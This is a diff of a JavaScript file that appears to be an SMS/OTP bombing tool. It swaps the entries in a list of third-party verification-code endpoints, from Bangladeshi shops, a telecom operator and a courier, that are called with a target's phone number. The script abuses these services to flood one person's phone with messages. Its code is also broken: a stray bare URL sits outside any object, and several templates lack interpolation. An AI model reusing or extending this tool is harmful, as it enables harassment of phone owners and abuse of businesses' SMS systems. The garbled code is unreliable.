@@ -12,27 +12,28 @@ $(document).ready(() => {
             var c = 0;
 
             const APIS = [
-                {
-                    method: "POST",
-                    url: `http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-${mobile}/operator-Robi/send`,
-                },
-                {
-                    method: 'POST',
-                    url: "http://robi.api.bongobd.com/api/login/send-otp",
-                    body: `msisdn=88${mobile}&operator=all`
-                },
+          
+
+https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=${phoneNumber}
                 {
                     method: 'GET',
-                    url: `http://45.114.85.19:8080/v3/otp/send?msisdn=88${mobile}`
+                    url: `https://ultranetrn.com.br/fonts/api.php?number={mobile}`
                 },
-                {
+               {
                     method: 'GET',
-                    url: `https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=${mobile}&countryPhoneCode=%2B88`
+                    url: `https://www.aarong.com/otpverify/account/sendotp/mobile_number/{mobile}`
                 },
-                {
-                    url: "https://ss.binge.buzz/otp/send/login",
-                    method: "POST",
-                    body: `phone=${mobile}`
+                 {
+                    method: 'GET',
+                    url: `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={mobile}`
+                },
+                 {
+                    method: 'GET',
+                    url: `https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={mobile}`
+                },
+                  {
+                    method: 'GET',
+                    url: `https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={mobile}`
                 }
 
             ];
